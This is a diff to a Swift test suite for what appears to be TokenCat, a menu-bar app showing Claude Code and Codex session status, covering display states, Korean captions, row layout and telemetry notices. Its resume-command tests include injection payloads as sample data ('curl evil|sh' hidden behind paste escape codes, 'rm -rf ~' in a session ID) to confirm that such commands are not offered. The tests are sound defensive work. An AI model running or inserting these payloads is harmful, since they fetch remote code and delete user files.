@@ -43,13 +43,17 @@ func runSessionPresentationChecks() -> [String] {
     check(state(reading("c", state: .complete)) == .complete && state(reading("i", state: .interrupted)) == .interrupted
           && state(reading("n")) == .idle && SessionDisplayState.idle.title == "최근 활동 없음", "inactive complete, interrupted and idle")
     check(state(reading("t", active: true, state: .tool)) == .tool, "open tool turn")
-    check(state(output) == .output && state(future) == .output, "output recorded within 5 s, including clock skew")
-    check(state(old) == .working && state(tooFuture) == .working, "older output falls back to working")
+    check(state(output) == .working && state(future) == .working && state(old) == .working && state(tooFuture) == .working,
+          "output is an event: a fresh record never changes the display state")
+    check(SessionDisplayState.liveOrder == [.input, .retrying, .tool, .working, .waiting]
+          && !SessionDisplayState.allCases.map(\.rawValue).contains("output"),
+          "one urgency order, input > retry > tool > working > waiting, with no output state")
     check(state(reading("telemetry:codex:model", .codex)) == .measurement, "telemetry rows are measurements")
     check(!SessionDisplayState.waiting.isRunning && SessionDisplayState.waiting.isLive && !SessionDisplayState.unfinished.isLive
           && SessionDisplayState.input.isRunning && SessionDisplayState.retrying.isRunning,
           "waiting is live but not running; unfinished is neither; input and retry are running")
 
+    let alphaRunning = reading("claude:run", session: "RUN", project: "Alpha", active: true, state: .working, last: -2)
     // Input: a pending question or plan approval, shown even when the turn is no longer marked active.
     var question = reading("claude:q", session: "Q", project: "zeta", state: .input, last: -192)
     question.toolCategory = .question
@@ -104,8 +108,14 @@ func runSessionPresentationChecks() -> [String] {
           "agent labels")
     check(SessionPresentation.childProjectSuffix(codexChild, parent: codexParent) == "sample-chat"
           && SessionPresentation.childProjectSuffix(claudeChild, parent: claudeParent) == nil, "child shows a differing project")
-    check(SessionPresentation.shortID(codexParent) == "R1" && SessionPresentation.identity(orphan, children: 0) == "Elsewhere · a9 · 하위",
-          "short identity")
+    var modelled = claudeParent
+    modelled.model = "claude-opus-5-5"
+    modelled.effort = "XHigh"
+    check(SessionPresentation.shortID(codexParent) == "R1" && SessionPresentation.shortID(orphan) == "a9"
+          && SessionPresentation.clientLine(modelled) == "Claude Code · claude-opus-5-5 · xhigh"
+          && SessionPresentation.clientLine(codexParent) == "Codex · 모델 기록 대기", "short identity and the one-text client line")
+    check(SessionPresentation.spokenLabel(modelled, state: .input) == "입력 필요, TokenCat, Claude Code claude-opus-5-5"
+          && SessionPresentation.spokenLabel(codexChild, state: .working) == "하위 에이전트 sample_runner, 진행", "VoiceOver row labels")
     var roleChild = claudeChild
     roleChild.agentRole = "Explore"
     var reviewChild = codexChild
@@ -129,8 +139,8 @@ func runSessionPresentationChecks() -> [String] {
     outputChild.lastOutputAt = at(-1)
     outputChild.lastOutputDelta = 12
     let mixedCounts = SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, outputChild], now: now))
-    check(mixedCounts.output == 1 && mixedCounts.tool == 0 && mixedCounts.toolMembers == 1 && mixedCounts.phase == .tool,
-          "a tool member stays countable when its group shows output")
+    check(mixedCounts.tool == 1 && mixedCounts.working == 0 && mixedCounts.toolMembers == 1 && mixedCounts.phase == .tool,
+          "a fresh record never hides a running tool in the group or the menu-bar phase")
     var inputChild = reading("claude:p/agent-q", session: "S1", agent: "q1", subagent: true, state: .input, last: -5)
     inputChild.toolCategory = .question
     let inputCounts = SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, inputChild, retrying], now: now))
@@ -141,18 +151,34 @@ func runSessionPresentationChecks() -> [String] {
           && SessionPresentation.childGroupText(.tool, count: 3) == "하위 3개 진행 중"
           && SessionPresentation.childGroupText(.waiting, count: 4) == "하위 4개 로그 대기", "an idle lead names its children's state")
     check(SessionCounts(SessionPresentation.groups([retrying], now: now)).phase == .working, "a retry alone keeps the neutral phase")
+    // Group state and menu-bar phase share one order: a retry outranks a tool in both.
+    var retryingChild = reading("claude:p/agent-r", session: "S1", agent: "r1", subagent: true, active: true, state: .working, last: -1)
+    retryingChild.retry = TokenRetryState(attempt: 1, maxAttempts: 10, retryAt: at(5), networkDown: false, at: at(-1))
+    let retryGroups = SessionPresentation.groups([claudeParent, claudeChild, retryingChild], now: now)
+    let retryCounts = SessionCounts(retryGroups)
+    check(retryGroups.first?.state == .retrying && retryCounts.retrying == 1 && retryCounts.tool == 0
+          && retryCounts.phase == SessionCounts.phase(.retrying) && retryCounts.phase == .working,
+          "group state and menu-bar phase follow the same order")
 
-    // The flow-card capsule: input > retry > tool category > progress > waiting.
+    // The flow-card caption: input > retry > tool category > progress > waiting, only after 30 s without a record.
+    func caption(_ counts: SessionCounts, _ last: TimeInterval?) -> FlowCaption {
+        SessionPresentation.flowCaption(counts: counts, last: last.map(at), now: now)
+    }
     var noticeCounts = SessionCounts(SessionPresentation.groups([command, reading("claude:w", session: "W", state: .stale, last: -200)], now: now))
-    check(SessionPresentation.flowNotice(counts: noticeCounts, last: at(-40), now: now) == "명령 실행 중 · 응답이 끝나면 토큰이 기록됩니다"
-          && SessionPresentation.flowNotice(counts: noticeCounts, last: at(-10), now: now) == nil, "tool category notice after 30 s")
+    check(caption(noticeCounts, -40).text == "명령 실행 중 · 응답 후 기록" && !caption(noticeCounts, -40).emphasized
+          && caption(noticeCounts, -10).text == "마지막 기록" && caption(noticeCounts, -10).glyph == nil, "tool category caption after 30 s")
     noticeCounts.tool = 0
-    check(SessionPresentation.flowNotice(counts: noticeCounts, last: nil, now: now) == "로그 대기 · 3분 동안 새 기록 없음", "waiting notice")
+    check(caption(noticeCounts, nil).text == "로그 대기 · 3분째 기록 없음", "waiting caption")
     let urgent = SessionCounts(SessionPresentation.groups([command, retrying, question], now: now))
     let retryOnly = SessionCounts(SessionPresentation.groups([command, retrying], now: now))
-    check(SessionPresentation.flowNotice(counts: urgent, last: at(-2), now: now) == "입력 필요 · 답변하면 계속됩니다"
-          && SessionPresentation.flowNotice(counts: retryOnly, last: at(-2), now: now) == "API 재시도 2/10 · 4초 후",
-          "input and retry notices show even right after a record")
+    check(caption(urgent, -2).text == "마지막 기록" && caption(urgent, -40).text == "입력 대기 · 답변하면 계속 기록"
+          && caption(urgent, -40).glyph == .input && caption(urgent, -40).emphasized
+          && caption(retryOnly, -40).text == "API 재시도 2/10 · 4초 후" && caption(retryOnly, -40).glyph == .retry,
+          "input and retry captions follow the same 30 s rule and are emphasized")
+    var offlineCounts = retryOnly
+    offlineCounts.retry?.networkDown = true
+    check(caption(offlineCounts, nil).text == "API 재시도 · 네트워크 끊김"
+          && caption(SessionCounts(), nil).text == "마지막 기록", "network-down retry; nothing live keeps the default")
     var plan2 = plan
     plan2.id = "claude:q2"
     plan2.sessionID = "Q2"
@@ -161,9 +187,36 @@ func runSessionPresentationChecks() -> [String] {
     question3.sessionID = "Q3"
     let plans = SessionCounts(SessionPresentation.groups([plan, plan2, command], now: now))
     let mixedInput = SessionCounts(SessionPresentation.groups([plan, question3], now: now))
-    check(plans.inputPlansOnly && SessionPresentation.flowNotice(counts: plans, last: nil, now: now) == "계획 승인 대기 2개 · 승인하면 계속됩니다"
-          && !mixedInput.inputPlansOnly && SessionPresentation.flowNotice(counts: mixedInput, last: nil, now: now) == "입력 필요 2개 · 답변하면 계속됩니다",
+    check(plans.inputPlansOnly && caption(plans, nil).text == "계획 승인 대기 · 승인하면 계속 기록"
+          && !mixedInput.inputPlansOnly && caption(mixedInput, nil).text == "입력 대기 · 답변하면 계속 기록",
           "plan approvals say 승인; a mix keeps the general copy")
+
+    // Header sentence (H-2) and head echo (H-3): one sentence per top state.
+    func header(_ counts: SessionCounts, loading: Bool = false) -> HeaderStatus {
+        SessionPresentation.headerStatus(counts: counts, loading: loading, now: now)
+    }
+    let loadingHeader = header(SessionCounts(), loading: true)
+    check(loadingHeader.sentence == "기록 확인 중" && loadingHeader.muted && loadingHeader.suffix.isEmpty && loadingHeader.glyph == nil,
+          "loading header")
+    check(header(urgent).spoken == "입력 필요 1개 · 진행 2개" && header(urgent).glyph == .input && header(urgent).head == .alert
+          && header(plans).spoken == "계획 승인 대기 2개 · 진행 1개"
+          && header(SessionCounts(SessionPresentation.groups([question], now: now))).spoken == "입력 필요 1개 · 답변하면 계속됩니다"
+          && header(urgent).help.contains("권한 확인 요청은 로그에 남지 않아"), "input header")
+    check(header(retryOnly).spoken == "API 재시도 1개 · 재시도 2/10 · 4초 후" && header(retryOnly).glyph == .retry, "retry header")
+    let toolHeader = header(SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, codexParent, codexChild], now: now)))
+    check(toolHeader.spoken == "세션 2개 진행 중 · 도구 실행 1 · 하위 2" && toolHeader.glyph == .tool && toolHeader.head == .normal
+          && header(SessionCounts(SessionPresentation.groups([alphaRunning], now: now))).spoken == "세션 1개 진행 중"
+          && header(SessionCounts(SessionPresentation.groups([alphaRunning], now: now))).glyph == .working, "tool and progress header")
+    check(header(noticeCounts).spoken == "로그 대기 1개 · 3분째 새 기록 없음" && header(noticeCounts).glyph == .waiting, "log-wait header")
+    let restHeader = header(SessionCounts(SessionPresentation.groups([reading("claude:old", session: "O", state: .complete, last: -7_300)], now: now)))
+    let recentHeader = header(SessionCounts(SessionPresentation.groups([reading("claude:new", session: "N", state: .complete, last: -120)], now: now)))
+    check(restHeader.spoken == "진행 중인 세션 없음 · 마지막 활동 2시간 전" && restHeader.glyph == nil && restHeader.head == .sleep
+          && recentHeader.head == .normal && header(SessionCounts()).spoken == "진행 중인 세션 없음" && header(SessionCounts()).head == .sleep,
+          "no live session: last activity, and the head sleeps after 10 minutes")
+    let oldCounts = SessionCounts(SessionPresentation.groups([reading("claude:old", session: "O", state: .complete, last: -7_300)], now: now))
+    check(SessionPresentation.headerStatus(counts: oldCounts, loading: false, now: now, quietSince: now.addingTimeInterval(-300)).head == .normal
+          && SessionPresentation.headerStatus(counts: oldCounts, loading: false, now: now, quietSince: now.addingTimeInterval(-700)).head == .sleep,
+          "the header head sleeps on the menu-bar cat's quiet reference, not only the last log record")
 
     // Stable ordering: input first, then running groups by project and session, unaffected by activity time.
     let beta = reading("claude:beta", session: "B", project: "beta", active: true, state: .working, last: -1)
@@ -186,13 +239,42 @@ func runSessionPresentationChecks() -> [String] {
     check(make(input + [question]).blocks.first?.id == "claude:q", "a turn waiting for input goes first")
     check(first.hiddenGroups == 6 && first.hiddenChildren == 0 && first.counts.groups == 12, "collapsed list fills to six rows")
     check(first.contentHeight == 44 * 3 + 28 * 3 + 5, "quiet live rows fold to 44pt; heights stay deterministic")
+    // Line 3 holds the current turn's last record, context or a measured speed; anything else stays at 44 pt.
     var flowing = alpha
-    flowing.recentOutputs = [TokenOutputEvent(at: at(-20), tokens: 40)]
-    let withBars = make([flowing], flow: FlowSeries.make([flowing], now: now))
+    flowing.currentTurnStartedAt = at(-60)
+    flowing.lastOutputAt = at(-20)
+    flowing.lastOutputDelta = 40
+    var earlierTurn = flowing
+    earlierTurn.currentTurnStartedAt = at(-10)
     var withContext = beta
     withContext.context = TokenContextUsage(usedTokens: 1_000, windowTokens: nil, recordedAt: at(-1))
-    check(withBars.blocks.first?.lead.height == 62 && make([withContext]).blocks.first?.lead.height == 62,
-          "bars or context keep the third line")
+    var withSpeed = beta
+    withSpeed.speedMeasurement = measurement
+    check(make([flowing]).blocks.first?.lead.height == 58 && make([withContext]).blocks.first?.lead.height == 58
+          && make([withSpeed]).blocks.first?.lead.height == 58 && make([earlierTurn]).blocks.first?.lead.height == 44
+          && SessionPresentation.lastRecord(flowing)?.tokens == 40 && SessionPresentation.lastRecord(earlierTurn) == nil,
+          "a record, context or measured speed keeps the third line; an earlier turn's record does not")
+    check(SessionRowItem(reading: beta, state: .working, kind: .live, showsDetail: false).height == 44
+          && SessionRowItem(reading: beta, state: .complete, kind: .idle).height == 28
+          && SessionRowItem(reading: claudeChild, state: .tool, kind: .child).height == 24
+          && SessionListModel.moreHeight == 24 && SessionListModel.captionHeight == 24 && SessionListModel.olderHeight == 28
+          && SessionListModel.dividerHeight == 1, "row heights on the 4 pt grid")
+    // Speed column (S-3): only when a visible live lead row has a measurement; child rows have no speed cell.
+    var restingSpeed = withSpeed
+    restingSpeed.active = false
+    restingSpeed.activityState = .complete
+    var measuredChild = claudeChild
+    measuredChild.speedMeasurement = measurement
+    check(!make([beta, alpha]).showsSpeedColumn && make([beta, withSpeed]).showsSpeedColumn
+          && !make([restingSpeed]).showsSpeedColumn && !make([claudeParent, measuredChild]).showsSpeedColumn
+          && !make([claudeParent, measuredChild], expanded: true).showsSpeedColumn,
+          "speed column follows visible live lead measurements")
+    // Short IDs only where two visible rows share a project.
+    var twin = beta
+    twin.id = "claude:beta2"
+    twin.sessionID = "B2"
+    check(make([beta, twin, alpha]).sharedProjects(showOlder: false) == ["beta"] && make([beta, alpha]).sharedProjects(showOlder: false).isEmpty,
+          "shared projects")
     let expanded = make(input, expanded: true)
     check(expanded.blocks.count == 12 && expanded.hiddenGroups == 0 && expanded.hiddenChildren == 0, "expanded shows every group")
     let family = make([codexParent, codexChild, reading("codex:done", .codex, session: "C2", agent: "/root/done",
@@ -240,17 +322,40 @@ func runSessionPresentationChecks() -> [String] {
     let dated = [reading("claude:d0", session: "D0", state: .complete, last: -600), reading("claude:d1", session: "D1", state: .complete, last: -day),
                  reading("claude:d2", session: "D2", state: .complete, last: -5 * day), reading("claude:d3", session: "D3", state: .complete, last: -9 * day)]
     let datedList = make([beta] + dated, expanded: true)
-    let datedIDs = ["claude:beta", "caption:오늘", "claude:d0", "caption:어제", "claude:d1", "divider:older", "older"]
-    let foldedHeight: CGFloat = 44 + 32 + 56 + 1 + 24, openHeight: CGFloat = 44 + 48 + 112 + 1
-    check(datedList.blocks.map(\.caption) == [nil, "오늘", "어제", "이전", nil] && datedList.olderCount == 2
-          && datedList.entries(showOlder: false).map(\.id) == datedIDs
+    let datedIDs = ["claude:beta", "caption:claude:d0", "claude:d0", "caption:claude:d1", "claude:d1", "divider:older", "older"]
+    // beta 44 + (caption 24 + row 28) × 2 + divider 1 + older 28; open: + (caption 24 + row 28 + divider 1 + row 28) instead of the fold.
+    let foldedHeight: CGFloat = 44 + 52 + 52 + 1 + 28, openHeight: CGFloat = 44 + 52 + 52 + 24 + 28 + 1 + 28
+    func rules(_ list: SessionListModel) -> [Bool] {
+        list.entries(showOlder: true).compactMap { entry -> Bool? in if case .caption(_, let rule, _) = entry { return rule } else { return nil } }
+    }
+    check(datedList.blocks.map(\.section) == [nil, "오늘", "어제", "이전", "이전"] && datedList.olderCount == 2
+          && datedList.entries(showOlder: false).map(\.id) == datedIDs && rules(datedList) == [true, true, true]
+          && rules(make(dated, expanded: true)) == [false, true, true]
           && datedList.contentHeight == foldedHeight && datedList.olderContentHeight == openHeight,
-          "captions, folded older section and both heights")
+          "captions, a rule above all but a caption at the top, folded older section and both heights")
+    // A frozen order can place two runs of the same section; each caption still has its own identity.
+    let frozenDated = datedList.reordered(["claude:beta", "claude:d0", "claude:d1", "claude:d2"])
+    let frozenIDs = frozenDated.entries(showOlder: true).map { $0.id }
+    check(Set(frozenIDs).count == frozenIDs.count, "duplicate list entry IDs")
+    // Keyboard navigation skips captions and dividers; selection starts at input, then retry, then the first row.
+    check(datedList.navigation(showOlder: false) == ["claude:beta", "claude:d0", "claude:d1", "older"]
+          && datedList.navigation(showOlder: true).count == 5
+          && make([beta, retrying, question]).startRow(showOlder: false) == "claude:q"
+          && make([beta, retrying]).startRow(showOlder: false) == "claude:r" && make([beta, alpha]).startRow(showOlder: false) == "claude:alpha",
+          "navigation rows and the first selection")
+    let floodNavigation = make([reading("claude:S1", session: "S1", project: "TokenCat", state: .complete, last: -600)]
+                               + (0..<5).map { reading("claude:S1/a\($0)", session: "S1", agent: "a0\($0)xxxxx", subagent: true, state: .stale, last: -100) })
+    check(floodNavigation.navigation(showOlder: false) == ["claude:S1", "claude:S1/a0", "claude:S1/a1", "claude:S1/a2", "more:claude:S1"],
+          "children and the +N row are navigable")
+    // Frozen order (S-8): known blocks keep their place, new ones go to the end, heights follow.
+    let frozen = make([beta, alpha, waiting]).reordered(["claude:wait", "claude:beta"])
+    check(frozen.blocks.map(\.id) == ["claude:wait", "claude:beta", "claude:alpha"] && frozen.contentHeight == make([beta, alpha, waiting]).contentHeight,
+          "a frozen order appends new blocks")
 
     // The viewport cut lands at least 12pt inside a row and hides at least 6pt of it.
     let long = make((0..<12).map { reading("claude:L\($0)", session: "L\($0)", active: true, state: .working, last: -1) })
     let cut = long.viewport(showOlder: false)
-    let tops = (0..<12).map { CGFloat($0) * 45 }
+    let tops = (0..<12).map { CGFloat($0) * 45 }  // 44 pt rows + 1 pt dividers
     check(long.contentHeight > SessionListModel.maxViewport && cut <= SessionListModel.maxViewport
           && tops.contains { cut - $0 >= 12 && $0 + 44 - cut >= 6 }, "viewport snaps inside a row")
     check(make([beta]).viewport(showOlder: false) == 44, "short lists are not snapped")
@@ -264,9 +369,15 @@ func runSessionPresentationChecks() -> [String] {
     claudeContext.context = TokenContextUsage(usedTokens: 182_331, windowTokens: nil, recordedAt: at(-120), compactedAt: at(-300))
     let codexSlot = SessionPresentation.context(codexContext, now: now)
     let claudeSlot = SessionPresentation.context(claudeContext, now: now)
-    check(codexSlot?.text == "컨텍스트 61% 사용" && codexSlot?.spoken == "컨텍스트 61퍼센트 사용" && codexSlot?.warning == false && SessionPresentation.context(nearlyFull, now: now)?.warning == true
-          && claudeSlot?.text == "컨텍스트 182k" && claudeSlot?.fraction == nil && claudeSlot?.help.contains("압축 완료 기록 5분 전") == true
+    check(codexSlot?.text == "컨텍스트 61% 사용" && codexSlot?.short == "61%" && codexSlot?.spoken == "컨텍스트 61퍼센트 사용"
+          && codexSlot?.warning == false && SessionPresentation.context(nearlyFull, now: now)?.warning == true
+          && claudeSlot?.text == "컨텍스트 182k" && claudeSlot?.short == "182k" && claudeSlot?.fraction == nil
+          && claudeSlot?.help.contains("압축 완료 기록 5분 전") == true
           && SessionPresentation.context(command, now: now) == nil, "context slots never infer a window")
+    var longAgo = claudeContext
+    longAgo.context?.compactedAt = at(-1_900)
+    check(claudeSlot?.compacted == "압축 5분 전" && SessionPresentation.context(longAgo, now: now)?.compacted == nil
+          && codexSlot?.compacted == nil, "a compaction shows as a fact for 30 minutes")
 
     // Codex usage limit: newest reset window, highest value inside it, always with its record age.
     var limited = command
@@ -287,6 +398,8 @@ func runSessionPresentationChecks() -> [String] {
           && SessionPresentation.windowLabel(2_880) == "2일" && SessionPresentation.countdown(to: at(42 * 60), now: now) == "42분",
           "expired windows, labels and countdowns")
     check(!UsageLimitSummary.help.contains("예상") && !(usage?.detail(now: now).contains("소진") ?? true), "no forecast in limit copy")
+    check(usage?.details(now: now) == ["5일 11시간 후 초기화 · 1분 전 기록", "5일 11시간 후 초기화"] && usage?.percentText == "28"
+          && expired.details(now: now) == ["초기화됨 · 다음 Codex 기록 대기"], "limit row variants keep the countdown whole")
     // Old Codex logs carry no reset time: different weeks cannot be told apart, so only the newest record counts.
     var undatedOld = command
     undatedOld.rateLimit = TokenRateLimit(usedPercent: 97, windowMinutes: 10_080, resetsAt: nil, recordedAt: at(-3 * day))
@@ -317,32 +430,50 @@ func runSessionPresentationChecks() -> [String] {
           && SessionPresentation.lastTurnSummary(finished)?.contains("/s") == false, "turn output and duration are never divided")
     check(SessionPresentation.helpAge(at(-45), now: now) == "1분 이내" && SessionPresentation.helpAge(at(-200), now: now) == "3분 전"
           && SessionPresentation.helpAge(nil, now: now) == "기록 없음", "help ages are minute-granular")
+    check(SessionPresentation.recordAge(at(-3), now: now) == "방금" && SessionPresentation.recordAge(at(-9.9), now: now) == "방금"
+          && SessionPresentation.recordAge(at(-10), now: now) == "10초 전" && SessionPresentation.recordAge(at(-47), now: now) == "40초 전"
+          && SessionPresentation.recordAge(at(-200), now: now) == "3분 전" && SessionPresentation.recordAge(at(3), now: now) == "방금",
+          "record ages: 방금, 10 s steps, then minutes")
+    check(SessionPresentation.spokenDuration(at(-45), now: now) == "45초" && SessionPresentation.spokenDuration(at(-252), now: now) == "4분"
+          && SessionPresentation.spokenDuration(at(-3_900), now: now) == "1시간 5분", "spoken durations read minutes past a minute")
 
-    // Footer telemetry notice by cause.
-    let port = SessionPresentation.telemetryNotice(ready: false, status: "실측 꺼짐 · 다른 앱이 포트 16493 사용 중", note: nil, restart: [])
-    let conflict = SessionPresentation.telemetryNotice(ready: true, status: "실측 수신 대기",
-                                                       note: "실측 연결: Codex otel 키가 중복되거나 여러 줄 형식이어서 변경하지 않았습니다.",
+    // Footer telemetry notice by collector state, never by matching status text.
+    let port = SessionPresentation.telemetryNotice(state: .busyOtherApp, note: nil, restart: [])
+    let conflict = SessionPresentation.telemetryNotice(state: .waiting, note: "실측 연결: Codex otel 키가 중복되거나 여러 줄 형식이어서 변경하지 않았습니다.",
                                                        failure: .conflict, restart: [.claude])
-    let failed = SessionPresentation.telemetryNotice(ready: true, status: "실측 수신 대기", note: "설정 저장 중 일부 파일이 변경됐습니다.", failure: .writeFailed(restored: false), restart: [])
-    let restart = SessionPresentation.telemetryNotice(ready: true, status: "실측 연결됨", note: nil, restart: [.claude, .codex])
-    let otherTokenCat = SessionPresentation.telemetryNotice(ready: false, status: "실측 꺼짐 · 다른 TokenCat이 수집 중", note: nil, restart: [])
-    let otherApp = SessionPresentation.telemetryNotice(ready: false, status: "실측 꺼짐 · 다른 앱이 포트 16493 사용 중", note: nil, restart: [])
-    let broken = SessionPresentation.telemetryNotice(ready: false, status: "실측 꺼짐 · 수집기를 시작하지 못함", note: nil, restart: [.claude])
-    let expiredNotice = SessionPresentation.telemetryNotice(ready: true, status: "실측 수신 대기", note: nil, restart: [.claude], expired: [.codex])
-    check(otherTokenCat?.kind == .busy && otherTokenCat?.text == "실측 꺼짐 · 다른 TokenCat" && otherApp?.kind == .portBusy
+    let failed = SessionPresentation.telemetryNotice(state: .waiting, note: "설정 저장 중 일부 파일이 변경됐습니다.", failure: .writeFailed(restored: false), restart: [])
+    let restart = SessionPresentation.telemetryNotice(state: .receiving, note: nil, restart: [.claude, .codex])
+    let otherTokenCat = SessionPresentation.telemetryNotice(state: .busyTokenCat, note: nil, restart: [])
+    let broken = SessionPresentation.telemetryNotice(state: .failed, note: nil, restart: [.claude])
+    let stopped = SessionPresentation.telemetryNotice(state: .stopped, status: "실측 꺼짐 · 실행 중인 TokenCat 수집기 없음", note: nil, restart: [])
+    let expiredNotice = SessionPresentation.telemetryNotice(state: .waiting, note: nil, restart: [.claude], expired: [.codex])
+    check(otherTokenCat?.kind == .busy && otherTokenCat?.text == "실측 꺼짐 · 다른 TokenCat" && port?.kind == .portBusy
           && broken?.kind == .collector && broken?.text == "실측 꺼짐 · 수집기 오류" && broken?.help.hasPrefix("실측 꺼짐 · 수집기를 시작하지 못함") == true
-          && [otherTokenCat, otherApp, broken].allSatisfy { $0?.collectorDown == true } && conflict?.collectorDown == false,
+          && stopped?.kind == .off && stopped?.help.hasPrefix("실측 꺼짐 · 실행 중인 TokenCat 수집기 없음") == true
+          && [otherTokenCat, port, broken, stopped].allSatisfy { $0?.collectorDown == true } && conflict?.collectorDown == false,
           "collector states keep their cause")
     check(expiredNotice?.kind == .expired && expiredNotice?.text == "실측 미수신 · 확인 필요" && expiredNotice?.isProblem == true
           && expiredNotice?.help.hasPrefix("Codex: 이 버전에서 실측을 받지 못했습니다") == true, "a day without a receipt asks for a check")
-    check(port?.kind == .portBusy && port?.text == "실측 꺼짐 · 포트 사용 중" && conflict?.text == "실측 꺼짐 · 설정 충돌"
+    check(port?.text == "실측 꺼짐 · 포트 사용 중" && conflict?.text == "실측 꺼짐 · 설정 충돌"
           && failed?.kind == .failed && restart?.text == "재시작 후 실측 표시" && restart?.isProblem == false
           && restart?.help.hasPrefix("Codex · Claude Code를 새로 실행하면") == true, "telemetry notice causes")
-    check(SessionPresentation.telemetryNotice(ready: true, status: "실측 수신 중", note: nil, restart: []) == nil
-          && SessionPresentation.telemetryNotice(ready: false, status: "실측 준비 중", note: nil, restart: []) == nil
-          && SessionPresentation.telemetryNotice(ready: false, status: "실측 연결 중지됨", note: nil, restart: [])?.kind == .off
+    check([TelemetryCollectorState.receiving, .waiting, .starting].allSatisfy { SessionPresentation.telemetryNotice(state: $0, note: nil, restart: []) == nil }
           && [port, conflict, failed, restart, otherTokenCat, broken, expiredNotice].allSatisfy { ($0?.text.filter { $0 != " " }.count ?? 0) <= 15 },
           "no notice while healthy; copy stays short")
+    // The footer's one item, by priority.
+    func footer(_ loading: Bool, _ ai: Int, _ system: Int, _ notice: TelemetryNotice?) -> FooterStatus {
+        SessionPresentation.footerStatus(loading: loading, tokenDelay: ai, systemDelay: system, notice: notice)
+    }
+    check(footer(true, 20, 20, port).kind == .loading && footer(false, 12, 5, port) == FooterStatus(kind: .aiDelay, text: "AI 수집 지연 12초")
+          && footer(false, 3, 4, port) == FooterStatus(kind: .systemDelay, text: "시스템 수집 지연 4초")
+          && footer(false, 0, 0, port) == FooterStatus(kind: .notice, text: "실측 꺼짐 · 포트 사용 중")
+          && footer(false, 0, 0, restart).text == "재시작 후 실측 표시" && footer(false, 0, 0, nil) == FooterStatus(kind: .live, text: "실시간"),
+          "footer priority: AI delay, system delay, notice, live")
+    check(OnboardingCard.outcome(notice: port, note: nil, failure: nil, state: .busyOtherApp) == .collectorDown("실측 꺼짐 · 포트 사용 중")
+          && OnboardingCard.outcome(notice: conflict, note: "실측 연결: 이유", failure: .conflict, state: .waiting) == .skipped("이유")
+          && OnboardingCard.outcome(notice: failed, note: "이유", failure: .writeFailed(restored: false), state: .waiting) == .failed("이유")
+          && OnboardingCard.outcome(notice: nil, note: nil, failure: nil, state: .starting) == .preparing
+          && OnboardingCard.outcome(notice: nil, note: nil, failure: nil, state: .receiving) == .added, "first-run outcome says only what happened")
     let restartSlot = SessionPresentation.speed(question, now: now, restartNeeded: true)
     check(restartSlot.value == "—" && restartSlot.help == "실측 연결됨 · Claude Code를 새로 실행하면 속도가 표시됩니다",
           "restart-needed speed help")
@@ -361,16 +492,55 @@ func runSessionPresentationChecks() -> [String] {
     located.projectPath = "/work/TokenCat"
     let home = URL(fileURLWithPath: "/Users/example")
     let actions = SessionPresentation.rowActions(located, home: home)
-    check(actions.map(\.title) == ["세션 ID 복사", "기록 파일 Finder에서 보기", "프로젝트 폴더 Finder에서 보기"]
-          && actions[1].kind == .reveal(home.appendingPathComponent(".claude/projects/-work-TokenCat/S1.jsonl"))
+    check(actions.map(\.title) == ["세션 ID 복사", "재개 명령 복사", "프로젝트 폴더 Finder에서 보기", "기록 파일 Finder에서 보기"]
+          && actions[3].kind == .reveal(home.appendingPathComponent(".claude/projects/-work-TokenCat/S1.jsonl"))
+          && actions.map(\.isReveal) == [false, false, true, true]
           && SessionPresentation.logFileURL(located, home: home)?.path == "/Users/example/.claude/projects/-work-TokenCat/S1.jsonl"
           && SessionPresentation.rowActions(claudeChild, home: home).map(\.title) == ["세션 ID 복사", "에이전트 ID 복사"]
-          && SessionPresentation.rowActions(telemetry, home: home).map(\.title) == ["세션 ID 복사"], "row actions")
+          && SessionPresentation.rowActions(telemetry, home: home).map(\.title) == ["세션 ID 복사"], "row actions: copies, then reveals")
+    // Resume command (decision 7): single-quoted folder, hidden for subagents or without an ID or folder.
+    var quoted = located
+    quoted.projectPath = "/work/it's here"
+    var codexRoot = codexParent
+    codexRoot.projectPath = "/work/TokenCat"
+    var odd = located
+    odd.sessionID = "S 1;x"
+    var relative = located
+    relative.projectPath = "work/TokenCat"
+    check(SessionPresentation.resumeCommand(located) == "cd '/work/TokenCat' && claude --resume S1"
+          && SessionPresentation.resumeCommand(quoted) == "cd '/work/it'\\''s here' && claude --resume S1"
+          && SessionPresentation.resumeCommand(codexRoot) == "cd '/work/TokenCat' && codex resume R1"
+          && SessionPresentation.resumeCommand(odd) == "cd '/work/TokenCat' && claude --resume 'S 1;x'"
+          && SessionPresentation.resumeCommand(claudeChild) == nil && SessionPresentation.resumeCommand(codexParent) == nil
+          && SessionPresentation.resumeCommand(relative) == nil && SessionPresentation.resumeCommand(telemetry) == nil,
+          "resume command quoting and hiding")
+    var fishEscape = located
+    fishEscape.projectPath = "/work/x\\';touch P;#"
+    var pasteKeys = located
+    pasteKeys.projectPath = "/work/x\u{1b}[201~\u{15}curl evil|sh\r"
+    var controlID = located
+    controlID.sessionID = "S1\nrm -rf ~"
+    check(SessionPresentation.resumeCommand(fishEscape) == nil && SessionPresentation.resumeCommand(pasteKeys) == nil
+          && SessionPresentation.resumeCommand(controlID) == nil,
+          "resume command offered for a path or ID with a backslash or control characters (fish quoting, paste injection)")
+    // Inline detail (S-6): metadata only, 16 + 15 per line + 0.5.
+    var detailed = command
+    detailed.model = "gpt-6.1-sol"
+    detailed.effort = "high"
+    detailed.lastOutputTokens = 7_493
+    detailed.lastTurnDurationSeconds = 252
+    let details = SessionPresentation.detailItems(detailed, state: .tool)
+    check(details.map(\.label) == ["세션 ID", "모델", "도구", "마지막 완료 턴", "기록 시점"]
+          && details.map(\.value) == ["C", "gpt-6.1-sol · high", "명령 실행 · exec", "7,493 tok · 4:12", "Codex는 응답 완료 시 기록"]
+          && details[0].copy == "C" && details[1].copy == nil
+          && SessionPresentation.detailHeight(detailed, state: .tool) == 16 + 15 * 5 + 0.5
+          && SessionPresentation.detailItems(claudeChild, state: .working).map(\.label) == ["세션 ID", "에이전트", "기록 시점"]
+          && SessionPresentation.detailItems(claudeChild, state: .working).last?.value == "Claude Code는 메시지 완료 시 기록",
+          "inline detail lines and height")
 
     // System and header mappings.
     check(MemoryPressure(1) == .normal && MemoryPressure(2) == .warning && MemoryPressure(4) == .critical && MemoryPressure(nil) == .unknown
           && MemoryPressure(4).title == "위험", "memory pressure levels")
-    check(SessionsHeader.compactChips(4) && !SessionsHeader.compactChips(3), "chips shrink before they overflow")
 
